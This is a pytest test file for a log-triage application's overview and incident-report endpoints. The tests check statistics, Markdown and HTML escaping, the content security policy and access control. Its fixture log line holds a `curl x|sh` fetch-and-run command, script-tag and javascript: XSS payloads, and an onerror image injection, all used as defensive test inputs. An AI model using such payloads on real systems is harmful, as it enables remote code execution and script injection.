from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient
from tests.conftest import admin_login
from tests.test_ingest_api import upload, wait
from tests.test_triage_api import ATTACK_LOG

HOSTILE = (
    "Oct 20 02:20:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/ ; USER=root ; "
    "COMMAND=/bin/sh -c `curl x|sh` <script>alert(1)</script> | [x](javascript:alert(1))\n"
)


@pytest.fixture
def seeded(client: TestClient) -> dict[str, str]:
    h = admin_login(client)
    upload(client, h, "attack.log", content=(ATTACK_LOG + HOSTILE).encode())
    wait(client)
    return h


def end_param() -> str:
    return datetime(2026, 10, 21, 0, 0, tzinfo=UTC).isoformat()


def test_overview_numbers_come_from_data(client: TestClient, seeded: dict[str, str]) -> None:
    o = client.get("/api/overview", params={"range": "7d", "end": end_param()}).json()
    assert o["events_total"] == 18
    assert sum(b["count"] for b in o["buckets"]) == 18
    assert sum(b["failures"] for b in o["buckets"]) == 12
    assert o["open_incidents"]["critical"] == 1
    assert o["open_alerts"]["critical"] >= 1
    assert {m["title"] for m in o["markers"]} >= {"SSH / RDP brute force"}
    assert o["noisy_rules"][0]["count"] >= 1
    tops = {(e["type"], e["value"]) for e in o["top_entities"]}
    assert ("host", "web01") in tops
    assert ("ip", "203.0.113.50") in tops
    assert o["fired_tactics"]["credential-access"] >= 1
    assert o["mttr_seconds"] is None  # nothing closed yet

    # Closing an alert produces a real MTTR.
    a = o["markers"][0]["id"]
    client.patch(
        f"/api/alerts/{a}", json={"status": "closed", "verdict": "false_positive"}, headers=seeded
    )
    o2 = client.get("/api/overview", params={"range": "24h"}).json()
    assert o2["closed_count"] == 1
    assert o2["mttr_seconds"] is not None
    assert o2["verdicts"] == {"false_positive": 1}


def test_overview_empty_range(client: TestClient, seeded: dict[str, str]) -> None:
    o = client.get("/api/overview", params={"range": "15m", "end": "2020-01-01T00:00:00Z"}).json()
    assert o["events_total"] == 0
    assert o["markers"] == []
    assert o["noisy_rules"] == []


def incident_id(client: TestClient) -> int:
    return int(client.get("/api/incidents").json()["items"][0]["id"])


def test_markdown_report(client: TestClient, seeded: dict[str, str]) -> None:
    iid = incident_id(client)
    client.post(
        f"/api/incidents/{iid}/notes",
        json={"markdown": "Confirmed with <b>owner</b>."},
        headers=seeded,
    )
    r = client.get(f"/api/incidents/{iid}/report", params={"format": "md"})
    assert r.status_code == 200
    assert 'filename="incident-' in r.headers["content-disposition"]
    md = r.text
    for part in (
        "# Incident #",
        "## Timeline",
        "## MITRE ATT&CK techniques",
        "T1110.001",
        "## Indicators of compromise",
        "203.0.113.50",
        "`svc-backup`",
        "## Analyst notes",
        "Confirmed with <b>owner</b>.",
        "## Activity log",
        "incident.create",
    ):
        assert part in md, part
    # attacker-controlled command line stays inside a code span without backticks/newlines
    line = next(line for line in md.splitlines() if "curl x" in line)
    assert "`curl x|sh`" not in line
    assert "`/bin/sh" in line
    assert "<script>" in line  # visible as text inside code, harmless in Markdown


def test_html_report_is_escaped_and_locked_down(client: TestClient, seeded: dict[str, str]) -> None:
    iid = incident_id(client)
    client.post(
        f"/api/incidents/{iid}/notes",
        json={"markdown": "<img src=x onerror=alert(1)>"},
        headers=seeded,
    )
    r = client.get(f"/api/incidents/{iid}/report", params={"format": "html"})
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/html")
    csp = r.headers["content-security-policy"]
    assert "default-src 'none'" in csp
    assert "script-src" not in csp
    body = r.text
    assert "<script>alert(1)</script>" not in body
    assert "<img src=x" not in body
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in body
    assert "@media print" in body
    assert "Timeline" in body


def test_report_requires_login_and_audits(client: TestClient, seeded: dict[str, str]) -> None:
    iid = incident_id(client)
    client.get(f"/api/incidents/{iid}/report")
    actions = [e["action"] for e in client.get("/api/audit").json()["items"]]
    assert "incident.report" in actions
    assert client.get("/api/incidents/9999/report").status_code == 404
    client.cookies.clear()
    assert client.get(f"/api/incidents/{iid}/report").status_code == 401
